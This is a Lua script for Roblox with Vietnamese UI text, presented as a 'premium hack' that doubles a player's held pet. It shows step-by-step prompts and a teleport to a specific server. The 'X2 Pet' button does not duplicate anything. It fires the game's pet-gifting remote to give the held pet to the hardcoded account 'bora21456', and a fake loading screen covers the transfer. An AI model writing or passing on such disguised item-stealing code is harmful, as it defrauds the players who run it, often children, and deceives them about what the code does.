local messages = {
    "🌸Hack Chỉ Dành Cho Pet Divine Lên💮",
    "📜 BƯỚC 0: Nhớ Đăng Ký Kênh",
    "📜 BƯỚC 1: Khi mở script xong, làm theo các bước này...",
    "📜 BƯỚC 2: Bấm 'Có' để vào server nhân 2 pet đang cầm",
    "📜 BƯỚC 3: Vào server xong ,,,bạn bấm 'Không'",
    "📜 BƯỚC 4: Hiện menu → bạn cầm pet muốn nhân đôi",
    "📜 BƯỚC 5: Bấm nút 'X2 Pet'",
    "📜 BƯỚC 6: Đợi 10 giây Là xong 🎉"
}

local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local player = Players.LocalPlayer

for _, msg in ipairs(messages) do
    local gui = Instance.new("ScreenGui", game.CoreGui)
    gui.ResetOnSpawn = false

    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(0, 500, 0, 50)
    frame.Position = UDim2.new(0.5, -250, 0, -60)
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    frame.BackgroundTransparency = 0.2
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

    local textLabel = Instance.new("TextLabel", frame)
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = msg
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    textLabel.TextScaled = true
    textLabel.Font = Enum.Font.GothamBold

    TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Bounce), {
        Position = UDim2.new(0.5, -250, 0.3, 0)
    }):Play()

    task.delay(2.9, function()
        TweenService:Create(frame, TweenInfo.new(0.4), {
            Position = UDim2.new(0.5, -250, -0.2, 0)
        }):Play()
        task.wait(2.0)
        gui:Destroy()
    end)

    wait(3)
end

-- GUI chính
local gui = Instance.new("ScreenGui", game.CoreGui)
gui.Name = "BugPetPrompt"

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 400, 0, 230)
frame.Position = UDim2.new(0.5, -200, 0.5, -115)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, -20, 0, 140)
title.Position = UDim2.new(0, 10, 0, 10)
title.Text = [[
⛩️━━━━━━━━━━━━━━━━━━━━━━━⛩️
      🔥 HACK SYSTEM - PREMIUM 🔥

🐾 Bạn muốn vào server nhân x2 pet không?
➡️ Chọn ngay để dịch chuyển đến nơi bí ẩn...
⛩️━━━━━━━━━━━━━━━━━━━━━━━⛩️
]]
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextWrapped = true
title.TextSize = 18
title.Font = Enum.Font.GothamBold
title.BackgroundTransparency = 1
title.TextYAlignment = Enum.TextYAlignment.Top

-- Nút Có
local yesBtn = Instance.new("TextButton", frame)
yesBtn.Size = UDim2.new(0.4, 0, 0, 40)
yesBtn.Position = UDim2.new(0.05, 0, 0.75, 0)
yesBtn.Text = "✅ Có"
yesBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
yesBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
yesBtn.Font = Enum.Font.GothamBold
yesBtn.TextSize = 18
Instance.new("UICorner", yesBtn).CornerRadius = UDim.new(0, 8)

-- Nút Không
local noBtn = Instance.new("TextButton", frame)
noBtn.Size = UDim2.new(0.4, 0, 0, 40)
noBtn.Position = UDim2.new(0.55, 0, 0.75, 0)
noBtn.Text = "❌ Không"
noBtn.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
noBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
noBtn.Font = Enum.Font.GothamBold
noBtn.TextSize = 18
Instance.new("UICorner", noBtn).CornerRadius = UDim.new(0, 8)

-- Xử lý nút Có
yesBtn.MouseButton1Click:Connect(function()
	TeleportService:TeleportToPlaceInstance(
		126884695634066,
		"9c1113cd-7cf3-4d3a-b9b2-c8f53918790c",
		player
	)
end)

-- Xử lý nút Không
noBtn.MouseButton1Click:Connect(function()
	frame:Destroy()

	local menu = Instance.new("Frame", gui)
	menu.Size = UDim2.new(0, 320, 0, 160)
	menu.Position = UDim2.new(0.5, -160, 0.5, -80)
	menu.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
	menu.Name = "X2PetMenu"
	Instance.new("UICorner", menu).CornerRadius = UDim.new(0, 12)

	local label = Instance.new("TextLabel", menu)
	label.Size = UDim2.new(1, 0, 0, 50)
	label.Text = "🐾 Menu Nhân x2 Pet"
	label.TextColor3 = Color3.fromRGB(255, 255, 255)
	label.Font = Enum.Font.GothamBold
	label.TextSize = 20
	label.BackgroundTransparency = 1

	local bugBtn = Instance.new("TextButton", menu)
	bugBtn.Size = UDim2.new(1, -40, 0, 40)
	bugBtn.Position = UDim2.new(0, 20, 0, 80)
	bugBtn.Text = "🐾 X2 Pet!"
	bugBtn.BackgroundColor3 = Color3.fromRGB(50, 120, 220)
	bugBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	bugBtn.Font = Enum.Font.Gotham
	bugBtn.TextSize = 18
	Instance.new("UICorner", bugBtn).CornerRadius = UDim.new(0, 8)

	local toggleBtn = Instance.new("TextButton", gui)
	toggleBtn.Size = UDim2.new(0, 30, 0, 30)
	toggleBtn.Position = UDim2.new(0.5, 160, 0.5, -110)
	toggleBtn.Text = "-"
	toggleBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
	toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	toggleBtn.Font = Enum.Font.GothamBold
	toggleBtn.TextSize = 22
	Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(0, 8)

	local visible = true
	toggleBtn.MouseButton1Click:Connect(function()
		visible = not visible
		menu.Visible = visible
		toggleBtn.Text = visible and "Đóng" or "Mở"
	end)

	-- Xử lý nút X2 Pet
	bugBtn.MouseButton1Click:Connect(function()
		local args = {
			"GivePet",
			Players:WaitForChild("bora21456")
		}
		ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))

		bugBtn.Text = "✅ Đã X2! Chờ 10 giây..."

		-- Hiện loading full màn hình
		local loadingGui = Instance.new("ScreenGui", game.CoreGui)
		loadingGui.Name = "LoadingScreen"

		local bg = Instance.new("Frame", loadingGui)
		bg.Size = UDim2.new(1, 0, 1, 0)
		bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		bg.BackgroundTransparency = 0.01

		local percentLabel = Instance.new("TextLabel", bg)
		percentLabel.Size = UDim2.new(0, 300, 0, 80)
		percentLabel.Position = UDim2.new(0.5, -150, 0.5, -40)
		percentLabel.Text = "⏳ Loading... 0%"
		percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		percentLabel.Font = Enum.Font.GothamBold
		percentLabel.TextScaled = true
		percentLabel.BackgroundTransparency = 1

		-- Tăng phần trăm từ 0 đến 100 trong 10 giây
		for i = 1, 100 do
			percentLabel.Text = "⏳ Loading... " .. i .. "%"
			wait(0.1)
		end

		loadingGui:Destroy()
	end)

end)